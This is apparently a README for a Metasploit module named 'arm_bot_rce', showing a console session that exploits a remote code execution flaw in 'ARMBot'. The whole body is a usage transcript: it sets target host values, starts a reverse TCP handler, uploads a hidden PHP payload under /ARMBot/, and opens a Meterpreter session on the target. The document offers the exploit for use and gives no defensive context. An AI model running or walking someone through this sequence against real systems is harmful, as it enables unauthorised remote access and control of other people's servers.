# ARMBot RCE
ARM Bot RCE Exploit.

```
msf5 exploit(arm_bot_rce) > set vhost example.com
vhost => example.com
msf5 exploit(arm_bot_rce) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf5 exploit(arm_bot_rce) > run

[*] Started reverse TCP handler on 0.0.0.0:4444 
[+] Payload uploaded under /ARMBot/.FXoK.php
[*] Sending stage (38247 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (0.0.0.0:4444 -> 2.2.2.2:34550) at 2019-08-05 22:45:10 +0200
[+] Payload successfully triggered !

meterpreter > 
```